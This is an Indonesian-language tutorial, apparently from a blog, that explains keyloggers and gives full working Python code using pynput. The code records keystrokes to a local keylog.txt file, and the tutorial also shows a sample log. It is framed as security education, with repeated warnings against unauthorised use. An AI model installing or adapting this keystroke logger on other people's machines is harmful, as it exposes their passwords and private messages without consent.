**Halo teman-teman...**

Bayangin lo lagi ngetik password akun bank, DM gebetan, atau bahkan curhat rahasia di notes—dan tanpa lo sadari, **ada sesuatu yang diam-diam merekam setiap ketukan jari lo**. Gak ada notifikasi. Gak ada suara. Cuma... *diam*. Tapi semua yang lo ketik? Udah disimpan. Dikirim. Bahkan mungkin udah dijual.

Ngeri, kan?

Itulah **keylogger**—alat yang bisa jadi senjata edukasi buat ngerti seberapa rentan data pribadi kita... atau jadi senjata buat orang jahat yang pengen nyuri identitas lo. Dan hari ini, **gue bakal nunjukin cara bikin keylogger sederhana pake Python**, **murni buat edukasi dan ethical hacking**. Jangan coba-coba dipake buat nge-hack orang beneran—itu ilegal, berbahaya, dan bisa bikin hidup lo hancur.

---

### 🔍 **Latar Belakang: Kenapa Keylogger Itu Menakutkan?**

Keylogger adalah program yang merekam setiap input keyboard. Di dunia nyata, malware kayak gini sering dipasang lewat file PDF palsu, software bajakan, atau link phishing. Korban gak sadar, tapi semua username, password, OTP, bahkan curhatan di WhatsApp desktop—bisa kebaca.

Tapi sebagai developer atau calon ethical hacker, **ngerti cara kerja keylogger itu penting**. Biar lo:
- Bisa deteksi ancaman,
- Ngerti celah keamanan sistem,
- Dan jadi lebih waspada saat pakai perangkat umum.

---

### ⚙️ **Mekanisme Kerja Keylogger Sederhana**

Kita bakal pake library `pynput`—yang bisa dengerin event keyboard secara real-time. Setiap kali lo pencet tombol, program ini:
1. Nangkep karakternya,
2. Simpen ke variabel buffer,
3. Terus tulis ke file `.txt` tiap 10 detik (biar gak terlalu mencurigakan).

File log-nya bakal muncul di folder yang sama dengan script Python-nya. Nama filenya: `keylog.txt`.

> ⚠️ **PERINGATAN**: Ini hanya untuk lingkungan lo sendiri. JANGAN install di komputer orang lain tanpa izin. Bisa kena UU ITE!

---

### 💻 **Full Code Keylogger Edukasi (Python)**

Pastikan lo udah install `pynput` dulu:
```bash
pip install pynput
```

Lalu, simpan kode di bawah ini sebagai `keylogger_edukasi.py`:

```python
# keylogger_edukasi.py
# TUJUAN: EDUKASI KEAMANAN CYBER — JANGAN DISALAHGUNAKAN!

import os
import logging
from pynput import keyboard
from threading import Timer

# Atur file log
log_dir = ""
log_file = os.path.join(log_dir, "keylog.txt")

# Setup logging biar gampang nulis ke file
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(message)s'
)

buffer = ""

def on_press(key):
    global buffer
    try:
        # Kalau tombol biasa (huruf/angka/simbol)
        buffer += str(key.char)
    except AttributeError:
        # Kalau tombol khusus kayak enter, spasi, backspace
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]  # hapus karakter terakhir
        else:
            buffer += f" [{str(key)}] "

    # Batasi buffer biar gak terlalu panjang
    if len(buffer) > 100:
        write_to_file()

def write_to_file():
    global buffer
    if buffer:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(buffer)
        buffer = ""  # reset buffer

# Simpan log tiap 10 detik (biar gak terlalu agresif)
def periodic_write():
    write_to_file()
    Timer(10, periodic_write).start()

# Mulai timer background
periodic_write()

# Jalankan listener keyboard
print("🔑 Keylogger aktif! Semua ketikan lo direkam ke 'keylog.txt'...")
print("Tekan Ctrl+C buat berhenti.")

with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        write_to_file()
        print("\n🛑 Keylogger dihentikan. Log tersimpan di keylog.txt")
```

---

### 📁 **Hasil Rekaman**

Setelah lo jalankan script ini, semua yang lo ketik bakal masuk ke file `keylog.txt`. Contoh isi file:

```
halo dunia!
password123
gue lagi curhat nih...
 [Key.enter] 
hapus itu! [Key.backspace] [Key.backspace] [Key.backspace] oke deh
```

Lo bisa liat betapa **mentah dan detailnya** data yang terekam—termasuk kesalahan ketik, backspace, dan tombol spesial.

---

### 🧠 **Pelajaran yang Harus Lo Ambil**

> **"Teknologi gak punya niat jahat—tapi manusia yang menggunakannya yang menentukan apakah itu pedang atau tameng."**

Keylogger itu kayak pisau dapur: bisa buat masak, bisa juga buat menusuk. Yang bedain? **NIAT dan IZIN**.

Kalau lo ngerti cara kerjanya, lo bakal:
- Lebih hati-hati pas pinjam laptop orang,
- Gak sembarangan download software,
- Dan mungkin jadi bagian dari tim keamanan yang melindungi orang lain.

---

### 🎯 **Judul Tutorial Kali Ini:**  
**"Seberapa Berbahaya Keylogger? — Rahasia yang Direkam Tanpa Suara"**

Jangan lupa: **ilmu itu amanah**. Gunakan hanya untuk membangun, bukan menghancurkan.

Stay curious. Stay ethical. 🔐
